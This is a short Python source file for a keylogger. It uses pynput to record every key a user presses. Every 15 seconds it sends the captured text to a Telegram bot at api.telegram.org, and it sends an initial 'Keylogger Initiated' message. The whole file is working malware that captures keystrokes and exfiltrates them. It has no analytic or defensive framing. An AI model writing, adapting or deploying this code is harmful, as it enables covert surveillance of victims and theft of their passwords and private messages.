import pynput.keyboard
import threading
import requests

klog=""
def process_key_press(key):
    global klog
    try:
        klog = klog+str(key.char)
    except AttributeError: #to handle special key as we are using key.char
        if key==key.space:
            klog=klog+" "
        else:
            klog=klog+" "+str(key)+" "

def report():
    global klog
    kurl= 'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id=-{CHAT_ID}&text="{}"'.format(klog)
    requests.get(kurl)
    #print(klog)
    klog=""
    timer=threading.Timer(15,report) #this timer waits for 15 second(time during which user will type something) and call the report function again.
    timer.start()

keyboard_listener=pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
    requests.get('https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id=-{CHAT_ID}&text= Keylogger Initiated ........')
    report() 
    keyboard_listener.join() 

